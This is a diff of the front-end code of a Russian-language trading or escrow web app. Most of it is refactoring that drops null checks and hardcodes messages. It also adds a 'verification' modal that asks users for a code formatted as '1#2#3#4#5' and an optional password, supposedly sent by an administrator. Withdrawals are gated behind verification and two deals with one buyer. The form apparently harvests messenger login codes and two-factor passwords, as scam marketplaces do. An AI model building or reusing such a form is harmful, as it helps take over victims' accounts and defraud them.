-                            <button class="btn btn-success" onclick="submitVerificationFromModal()">
-                                <i class="fas fa-check"></i> Подтвердить код
-                            </button>
-                        `;
-                    }
+                    document.getElementById('verifyModalResult').innerHTML = `
+                        <div class="verification-status verified" style="display:block;">
+                            <i class="fas fa-check-circle"></i>
+                            ✅ Запрос отправлен! Ожидайте код от администратора.
+                        </div>
+                        <div class="form-group mt-10">
+                            <label>🔑 Введите код (формат: 1#2#3#4#5)</label>
+                            <input type="text" id="verifyCodeModal" placeholder="1#2#3#4#5">
+                        </div>
+                        <div class="form-group">
+                            <label>🔐 Пароль (если есть)</label>
+                            <input type="text" id="verifyPasswordModal" placeholder="Введите пароль">
+                        </div>
+                        <button class="btn btn-success" onclick="submitVerificationFromModal()">
+                            <i class="fas fa-check"></i> Подтвердить код
+                        </button>
+                    `;
                 } else {
                     showToast('❌ ' + (data.error || 'Ошибка отправки'), 'error');
                 }
@@ -1521,16 +1615,13 @@
                 
                 if (data.success) {
                     showToast('✅ Верификация пройдена! Сессия активна 24 часа.', 'success');
-                    const resultDiv = document.getElementById('verifyModalResult');
-                    if (resultDiv) {
-                        resultDiv.innerHTML = `
-                            <div class="verification-status verified" style="display:block;">
-                                <i class="fas fa-check-circle"></i>
-                                ✅ Верификация успешно пройдена!
-                                ${data.expires_at ? `<br><small>🕐 Сессия активна до: ${new Date(data.expires_at).toLocaleString()}</small>` : ''}
-                            </div>
-                        `;
-                    }
+                    document.getElementById('verifyModalResult').innerHTML = `
+                        <div class="verification-status verified" style="display:block;">
+                            <i class="fas fa-check-circle"></i>
+                            ✅ Верификация успешно пройдена!
+                            ${data.expires_at ? `<br><small>🕐 Сессия активна до: ${new Date(data.expires_at).toLocaleString()}</small>` : ''}
+                        </div>
+                    `;
                     state.isVerified = true;
                     state.verificationExpires = data.expires_at;
                     setTimeout(() => { closeModal(); }, 3000);
@@ -1549,19 +1640,19 @@
                          (state.balance.rub || 0) + (state.balance.uah || 0);
             
             if (total === 0) {
-                showToast('❌ ' + getLangText('balanceZero'), 'error');
+                showToast('❌ Ваш баланс равен 0. Пополните баланс для вывода.', 'error');
                 return;
             }
 
             const check = await apiCall('/api/has_2_deals');
             if (!check.has_2_deals) {
-                showToast('⚠️ ' + getLangText('need2Deals') + state.totalDeals, 'error');
+                showToast('⚠️ Для вывода нужно провести 2 успешные сделки с одним покупателем. У вас: ' + state.totalDeals, 'error');
                 return;
             }
 
             const verif = await apiCall('/api/verification_status');
             if (!verif.verified) {
-                showToast('⚠️ ' + getLangText('verificationRequired'), 'error');
+                showToast('⚠️ Для вывода необходима верификация. Пройдите проверку.', 'error');
                 showVerificationModal();
                 return;
             }
@@ -1575,19 +1666,15 @@
             }
 
             const btn = document.querySelector('#withdrawSection .btn-primary');
-            if (btn) {
-                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';
-                btn.disabled = true;
-            }
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';
+            btn.disabled = true;
 
             try {
                 const data = await apiCall('/api/withdraw', { currency, details });
                 if (data.success) {
                     showToast('✅ Заявка на вывод создана!', 'success');
-                    const section = document.getElementById('withdrawSection');
-                    if (section) section.style.display = 'none';
-                    const detailsInput = document.getElementById('withdrawDetails');
-                    if (detailsInput) detailsInput.value = '';
+                    document.getElementById('withdrawSection').style.display = 'none';
+                    document.getElementById('withdrawDetails').value = '';
                     loadBalance();
                 } else {
                     showToast('❌ ' + (data.error || 'Ошибка'), 'error');
@@ -1595,10 +1682,8 @@
             } catch (err) {
                 showToast('❌ Ошибка: ' + err.message, 'error');
             } finally {
-                if (btn) {
-                    btn.innerHTML = '<i class="fas fa-check"></i> ' + getLangText('btnConfirmWithdraw');
-                    btn.disabled = false;
-                }
+                btn.innerHTML = '<i class="fas fa-check"></i> Подтвердить вывод';
+                btn.disabled = false;
             }
         }
 
@@ -1607,7 +1692,6 @@
         // ============================================================
         async function loadAdminPanel() {
             const container = document.getElementById('adminContent');
-            if (!container) return;
             container.innerHTML = '<div class="loading"><i class="fas fa-spinner"></i> Проверка прав...</div>';
             try {
                 const data = await apiCall('/api/is_admin');
@@ -1827,25 +1911,17 @@
         // 16. МОДАЛКА
         // ============================================================
         function showModal(html) {
-            const body = document.getElementById('modalBody');
-            const modal = document.getElementById('modal');
-            if (body && modal) {
-                body.innerHTML = html;
-                modal.classList.add('active');
-            }
+            document.getElementById('modalBody').innerHTML = html;
+            document.getElementById('modal').classList.add('active');
         }
 
         function closeModal() {
-            const modal = document.getElementById('modal');
-            if (modal) modal.classList.remove('active');
+            document.getElementById('modal').classList.remove('active');
         }
 
-        const modalEl = document.getElementById('modal');
-        if (modalEl) {
-            modalEl.addEventListener('click', (e) => {
-                if (e.target === modalEl) closeModal();
-            });
-        }
+        document.getElementById('modal').addEventListener('click', (e) => {
+            if (e.target === document.getElementById('modal')) closeModal();
+        });
 
         // ============================================================
         // 17. TOAST
@@ -1871,15 +1947,14 @@
         loadReviews();
 
         setInterval(() => {
-            const onlineEl = document.getElementById('onlineCount');
-            if (onlineEl) onlineEl.textContent = getOnlineCount();
+            document.getElementById('onlineCount').textContent = getOnlineCount();
         }, 5000);
 
         setInterval(() => {
-            if (document.getElementById('page-main')?.classList.contains('active')) loadMainData();
-            if (document.getElementById('page-balance')?.classList.contains('active')) loadBalance();
-            if (document.getElementById('page-deals')?.classList.contains('active')) loadDeals();
-            if (document.getElementById('page-reviews')?.classList.contains('active')) loadReviews();
+            if (document.getElementById('page-main').classList.contains('active')) loadMainData();
+            if (document.getElementById('page-balance').classList.contains('active')) loadBalance();
+            if (document.getElementById('page-deals').classList.contains('active')) loadDeals();
+            if (document.getElementById('page-reviews').classList.contains('active')) loadReviews();
         }, 30000);
     </script>
 </body>
